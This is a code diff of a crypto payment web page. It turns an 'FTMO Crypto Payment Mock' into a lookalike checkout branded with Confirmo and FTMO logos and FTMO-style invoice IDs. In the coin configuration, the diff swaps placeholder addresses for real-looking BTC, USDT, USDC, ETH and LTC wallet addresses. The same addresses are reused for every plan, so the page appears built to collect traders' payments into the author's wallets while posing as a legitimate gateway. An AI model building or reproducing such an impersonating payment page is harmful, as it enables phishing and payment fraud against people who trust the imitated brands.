@@ -2,9 +2,17 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <title>FTMO Crypto Payment Mock</title>
+  <title>Confirmo</title>
+  <link rel="icon" type="image/png" href="Confirm_logo.png?v=1.0">
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <style>
+    .currency-icon img {
+      width: 70%;
+      height: 70%;
+      object-fit: contain;
+      display: block;
+    }
+
     * {
       box-sizing: border-box;
       margin: 0;
@@ -14,20 +22,30 @@
 
     /* NỀN VÀNG + HIỆU ỨNG */
     body {
+      position: relative;
       min-height: 100vh;
+      margin: 0;
       display: flex;
       align-items: center;
       justify-content: center;
-      background: linear-gradient(135deg, #facc15 0%, #f97316 40%, #fef3c7 100%);
-      background-size: 180% 180%;
-      animation: bg-pan 18s ease-in-out infinite;
+      overflow: hidden; /* tránh tràn */
     }
 
-    @keyframes bg-pan {
-      0% { background-position: 0% 50%; }
-      50% { background-position: 100% 50%; }
-      100% { background-position: 0% 50%; }
+    /* LỚP NỀN MỜ */
+    body::before {
+      content: "";
+      position: absolute;
+      inset: 0;
+      background-image: url("wallpaper.png");
+      background-size: cover;
+      background-position: center;
+      background-repeat: no-repeat;
+
+      filter: blur(40px);        /* mức độ mờ */
+      transform: scale(1.1);     /* tránh thấy viền ảnh khi blur */
+      z-index: -1;               /* cho nó nằm dưới toàn bộ nội dung */
     }
+
 
     .payment-shell {
       display: flex;
@@ -41,16 +59,12 @@
     /* THẺ CHÍNH: GLASS + FLOAT */
     .payment-card {
       width: 100%;
-      max-width: 575px; /* tăng ~25% so với 460px */
-      border-radius: 28px;
-      background: rgba(255, 255, 255, 0.94);
-      border: 1px solid rgba(250, 204, 21, 0.35);
-      box-shadow:
-        0 20px 60px rgba(15, 23, 42, 0.4),
-        0 0 0 1px rgba(255, 255, 255, 0.6);
+      max-width: 575px;
+      border-radius: 24px;
+      background: #ffffff;
+      box-shadow: 0 18px 45px rgba(15, 23, 42, 0.40);
       overflow: hidden;
-      backdrop-filter: blur(18px);
-      animation: floatCard 9s ease-in-out infinite;
+      /* bỏ blur + animation */
     }
 
     @keyframes floatCard {
@@ -74,23 +88,31 @@
       display: flex;
       align-items: center;
       gap: 14px;
-      background: linear-gradient(135deg, #facc15 0%, #f97316 40%, #fed7aa 100%);
+
+      /* làm trong + mờ kiểu Confirmo */
+      background: rgba(255, 255, 255, 0.45); 
+      backdrop-filter: blur(18px);
+
+      border-bottom: 1px solid rgba(0,0,0,0.08);
     }
 
     .header-logo {
-      width: 55px;  /* to hơn 1 chút cho cân */
+      width: 55px;
       height: 55px;
-      border-radius: 50%;
+      border-radius: 16px;            /* có thể bỏ nếu muốn logo vuông */
       background: rgba(15, 23, 42, 0.92);
       display: flex;
       align-items: center;
       justify-content: center;
-      color: #f9fafb;
-      font-weight: 700;
-      font-size: 22px;
-      flex-shrink: 0;
       box-shadow: 0 6px 16px rgba(15, 23, 42, 0.6);
     }
+
+    .header-logo-img {
+      width: 80%;
+      height: 80%;
+      object-fit: contain;
+    }
+
 
     .header-main {
       flex: 1;
@@ -381,7 +403,7 @@
       box-shadow:
         0 0 0 1px rgba(250, 204, 21, 0.3),
         0 12px 30px rgba(15, 23, 42, 0.28);
-      animation: qrPulse 2.8s ease-in-out infinite;
+
     }
 
     @keyframes qrPulse {
@@ -541,19 +563,21 @@
       text-decoration: underline;
     }
   </style>
+  <link rel="stylesheet" href="confirmo-anim.css">
 </head>
 <body>
   <div class="payment-shell">
     <div class="payment-card" data-state="methods">
       <div class="payment-header">
-        <div class="header-logo">F</div>
+        <div class="header-logo">
+          <img src="logo-ftmo.png" alt="FTMO logo" class="header-logo-img">
+        </div>
         <div class="header-main">
           <div class="header-title">FTMO Challenge</div>
-          <div class="header-sub">Invoice ID:  invz2PZa7x4M9gdFTMO70-XXXX</div>
+          <div class="header-sub">Invoice ID: DEMO-XXXX</div>
         </div>
         <div class="header-amount" id="invoice-amount">0.00 USD</div>
       </div>
-
       <div class="payment-body">
         <!-- SCREEN 1: CHỌN COIN -->
         <section class="screen active" id="screen-methods">
@@ -652,7 +676,9 @@
         </span>
       </div>
     </div>
-
+    <div class="confirmo-demo-label">
+      CONFIRMO 
+    </div>
     <div class="brand-footer">
       By using the payment gateway, you agree to the terms of the Cookie Policy.
     </div>
@@ -669,38 +695,44 @@
         subtitle: "Pay with Bitcoin",
         network: "Network: Bitcoin",
         defaultNote:
-          "Send only BTC via Bitcoin network. Other coins or networks will result in loss of funds."
+          "Send only BTC via Bitcoin network. Other coins or networks will result in loss of funds.",
+        logo: "logo-btc.png"
       },
       USDT: {
         name: "Tether USD",
         iconClass: "icon-usdt",
         subtitle: "Stablecoin (USDT)",
-        network: "Network: TRON (TRC20) or ERC20 (check instructions)",
+        network: "Network: TRON (TRC20)",
         defaultNote:
-          "Send only USDT to this address using the correct network (TRC20 or ERC20 as instructed by the prop firm)."
+          "Send only USDT to this address using the correct network (TRC20 as instructed by the prop firm).",
+        logo: "logo-usdt.png"
       },
       USDC: {
         name: "USD Coin",
         iconClass: "icon-usdc",
         subtitle: "Stablecoin (USDC)",
         network: "Network: Ethereum",
-        defaultNote: "Send only USDC via Ethereum network."
+        defaultNote: "Send only USDC via Ethereum network.",
+        logo: "logo-usdc.png"
       },
       ETH: {
         name: "Ether",
         iconClass: "icon-eth",
         subtitle: "Pay with ETH",
         network: "Network: Ethereum",
-        defaultNote: "Send only ETH via Ethereum network."
+        defaultNote: "Send only ETH via Ethereum network.",
+        logo: "logo-eth.png"
       },
       LTC: {
         name: "Litecoin",
         iconClass: "icon-ltc",
         subtitle: "Pay with Litecoin",
         network: "Network: Litecoin",
-        defaultNote: "Send only LTC via Litecoin network."
+        defaultNote: "Send only LTC via Litecoin network.",
+        logo: "logo-ltc.png"
       }
     };
+
 
     /*********************************************************
      * 2) CẤU HÌNH 5 GÓI – GIÁ ĐÃ CẬP NHẬT
@@ -711,11 +743,11 @@
         invoiceId: " invz2PZa7x4M9gdFTMO70-10K-394",
         usd: "33.34",
         coins: {
-          BTC: { amountCrypto: "0.00036433 BTC", qr: "qr-10k-btc.png", address: "bc1q-your-10k-btc-address" },
-          USDT:{ amountCrypto: "33.34 USDT",     qr: "qr-10k-usdt.png", address: "T-your-10k-usdt-address" },
-          USDC:{ amountCrypto: "33.34 USDC",     qr: "qr-10k-usdc.png", address: "0x-your-10k-usdc-address" },
-          ETH: { amountCrypto: "0.010864 ETH",   qr: "qr-10k-eth.png",  address: "0x-your-10k-eth-address" },
-          LTC: { amountCrypto: "0.3889 LTC",     qr: "qr-10k-ltc.png",  address: "ltc-your-10k-ltc-address" }
+          BTC: { amountCrypto: "0.00036433 BTC", qr: "qr-btc.png", address: "bc1q-your-10k-btc-address" },
+          USDT:{ amountCrypto: "33.34 USDT",     qr: "qr-usdt.png", address: "TK3hCNdgobYsTSJBu2TXmWtw3ApxwuH6sT" },
+          USDC:{ amountCrypto: "33.34 USDC",     qr: "qr-usdc.png", address: "0x7c445612fb1fcd286c1d647aec1f7863cde40d26" },
+          ETH: { amountCrypto: "0.010864 ETH",   qr: "qr-eth.png",  address: "0x9d4ab0c77837971aefff359fd3fcbf7b58ae0b49" },
+          LTC: { amountCrypto: "0.3889 LTC",     qr: "qr-ltc.png",  address: "LdKtRuGP5dJ3gmYHV6c97qzyaRzJXfV4ZY" }
         }
       },
 
@@ -724,11 +756,11 @@
         invoiceId: " dueo4RDw6q1T6zAFTMO70-25K-092",
         usd: "88.25",
         coins: {
-          BTC: { amountCrypto: "0.00096437 BTC", qr: "qr-25k-btc.png", address: "bc1q-your-25k-btc-address" },
-          USDT:{ amountCrypto: "88.25 USDT",     qr: "qr-25k-usdt.png", address: "T-your-25k-usdt-address" },
-          USDC:{ amountCrypto: "88.25 USDC",     qr: "qr-25k-usdc.png", address: "0x-your-25k-usdc-address" },
-          ETH: { amountCrypto: "0.028757 ETH",   qr: "qr-25k-eth.png",  address: "0x-your-25k-eth-address" },
-          LTC: { amountCrypto: "1.0294 LTC",     qr: "qr-25k-ltc.png",  address: "ltc-your-25k-ltc-address" }
+          BTC: { amountCrypto: "0.00096437 BTC", qr: "qr-btc.png", address: "bc1qs680jtk5jcs5a0ctdr4pm07uxvgn9zr56d3x36" },
+          USDT:{ amountCrypto: "88.25 USDT",     qr: "qr-usdt.png", address: "TK3hCNdgobYsTSJBu2TXmWtw3ApxwuH6sT" },
+          USDC:{ amountCrypto: "88.25 USDC",     qr: "qr-usdc.png", address: "0x7c445612fb1fcd286c1d647aec1f7863cde40d26" },
+          ETH: { amountCrypto: "0.028757 ETH",   qr: "qr-eth.png",  address: "0x9d4ab0c77837971aefff359fd3fcbf7b58ae0b49" },
+          LTC: { amountCrypto: "1.0294 LTC",     qr: "qr-ltc.png",  address: "LdKtRuGP5dJ3gmYHV6c97qzyaRzJXfV4ZY" }
         }
       },
 
@@ -737,11 +769,11 @@
         invoiceId: " qert5OWm1q3J31aAFTMO70-50K-013",
         usd: "122.83",
         coins: {
-          BTC: { amountCrypto: "0.00134225 BTC", qr: "qr-50k-btc.png", address: "bc1q-your-50k-btc-address" },
-          USDT:{ amountCrypto: "122.83 USDT",    qr: "qr-50k-usdt.png", address: "T-your-50k-usdt-address" },
-          USDC:{ amountCrypto: "122.83 USDC",    qr: "qr-50k-usdc.png", address: "0x-your-50k-usdc-address" },
-          ETH: { amountCrypto: "0.040025 ETH",   qr: "qr-50k-eth.png",  address: "0x-your-50k-eth-address" },
-          LTC: { amountCrypto: "1.4328 LTC",     qr: "qr-50k-ltc.png",  address: "ltc-your-50k-ltc-address" }
+          BTC: { amountCrypto: "0.00134225 BTC", qr: "qr-btc.png", address: "bc1qs680jtk5jcs5a0ctdr4pm07uxvgn9zr56d3x36" },
+          USDT:{ amountCrypto: "122.83 USDT",    qr: "qr-usdt.png", address: "TK3hCNdgobYsTSJBu2TXmWtw3ApxwuH6sT" },
+          USDC:{ amountCrypto: "122.83 USDC",    qr: "qr-usdc.png", address: "0x7c445612fb1fcd286c1d647aec1f7863cde40d26" },
+          ETH: { amountCrypto: "0.040025 ETH",   qr: "qr-eth.png",  address: "0x9d4ab0c77837971aefff359fd3fcbf7b58ae0b49" },
+          LTC: { amountCrypto: "1.4328 LTC",     qr: "qr-ltc.png",  address: "LdKtRuGP5dJ3gmYHV6c97qzyaRzJXfV4ZY" }
         }
       },
 
@@ -750,11 +782,11 @@
         invoiceId: " tyyq1ERa7x4Y9gGFTMO70-100K-173",
         usd: "191.95",
         coins: {
-          BTC: { amountCrypto: "0.00209757 BTC", qr: "qr-100k-btc.png", address: "bc1q-your-100k-btc-address" },
-          USDT:{ amountCrypto: "191.95 USDT",    qr: "qr-100k-usdt.png", address: "T-your-100k-usdt-address" },
-          USDC:{ amountCrypto: "191.95 USDC",    qr: "qr-100k-usdc.png", address: "0x-your-100k-usdc-address" },
-          ETH: { amountCrypto: "0.062548 ETH",   qr: "qr-100k-eth.png",  address: "0x-your-100k-eth-address" },
-          LTC: { amountCrypto: "2.2390 LTC",     qr: "qr-100k-ltc.png",  address: "ltc-your-100k-ltc-address" }
+          BTC: { amountCrypto: "0.00209757 BTC", qr: "qr-btc.png", address: "bc1qs680jtk5jcs5a0ctdr4pm07uxvgn9zr56d3x36" },
+          USDT:{ amountCrypto: "191.95 USDT",    qr: "qr-usdt.png", address: "TK3hCNdgobYsTSJBu2TXmWtw3ApxwuH6sT" },
+          USDC:{ amountCrypto: "191.95 USDC",    qr: "qr-usdc.png", address: "0x7c445612fb1fcd286c1d647aec1f7863cde40d26" },
+          ETH: { amountCrypto: "0.062548 ETH",   qr: "qr-eth.png",  address: "0x9d4ab0c77837971aefff359fd3fcbf7b58ae0b49" },
+          LTC: { amountCrypto: "2.2390 LTC",     qr: "qr-ltc.png",  address: "LdKtRuGP5dJ3gmYHV6c97qzyaRzJXfV4ZY" }
         }
       },
 
@@ -763,11 +795,11 @@
         invoiceId: " i2w3fREa2Efư9Dg-200K-035",
         usd: "381.59",
         coins: {
-          BTC: { amountCrypto: "0.00416991 BTC", qr: "qr-200k-btc.png", address: "bc1q-your-200k-btc-address" },
-          USDT:{ amountCrypto: "381.59 USDT",    qr: "qr-200k-usdt.png", address: "T-your-200k-usdt-address" },
-          USDC:{ amountCrypto: "381.59 USDC",    qr: "qr-200k-usdc.png", address: "0x-your-200k-usdc-address" },
-          ETH: { amountCrypto: "0.124344 ETH",   qr: "qr-200k-eth.png",  address: "0x-your-200k-eth-address" },
-          LTC: { amountCrypto: "4.4511 LTC",     qr: "qr-200k-ltc.png",  address: "ltc-your-200k-ltc-address" }
+          BTC: { amountCrypto: "0.00416991 BTC", qr: "qr-btc.png", address: "bc1qs680jtk5jcs5a0ctdr4pm07uxvgn9zr56d3x36" },
+          USDT:{ amountCrypto: "381.59 USDT",    qr: "qr-usdt.png", address: "TK3hCNdgobYsTSJBu2TXmWtw3ApxwuH6sT" },
+          USDC:{ amountCrypto: "381.59 USDC",    qr: "qr-usdc.png", address: "0x7c445612fb1fcd286c1d647aec1f7863cde40d26" },
+          ETH: { amountCrypto: "0.124344 ETH",   qr: "qr-eth.png",  address: "0x9d4ab0c77837971aefff359fd3fcbf7b58ae0b49" },
+          LTC: { amountCrypto: "4.4511 LTC",     qr: "qr-ltc.png",  address: "LdKtRuGP5dJ3gmYHV6c97qzyaRzJXfV4ZY" }
         }
       }
     };
@@ -815,7 +847,8 @@
         qr: coinPlan.qr,
         address: coinPlan.address,
         network: meta.network,
-        note: coinPlan.note || meta.defaultNote
+        note: coinPlan.note || meta.defaultNote,
+        logo: meta.logo        // <-- thêm dòng này
       };
     });
 
@@ -866,7 +899,9 @@
           btn.setAttribute("data-code", opt.code);
 
           btn.innerHTML = `
-            <div class="currency-icon ${opt.iconClass}">${opt.code[0]}</div>
+            <div class="currency-icon ${opt.iconClass}">
+              <img src="${opt.logo}" alt="${opt.name} logo">
+            </div>
             <div class="currency-main">
               <div class="currency-name">${opt.name}</div>
               <div class="currency-sub">${opt.subtitle}</div>
@@ -874,6 +909,7 @@
             <div class="currency-amount">${opt.amountCrypto}</div>
             <div class="currency-chevron">›</div>
           `;
+
 
           btn.addEventListener("click", () => openPayment(opt));
           currencyListEl.appendChild(btn);
@@ -887,7 +923,8 @@
       currentOption = option;
 
       payIcon.className = "currency-icon " + option.iconClass;
-      payIcon.textContent = option.code[0];
+      payIcon.innerHTML = `<img src="${option.logo}" alt="${option.name} logo">`;
+
 
       payCoinName.textContent = `${option.name} (${option.code})`;
       payCoinNetwork.textContent = option.network || "";
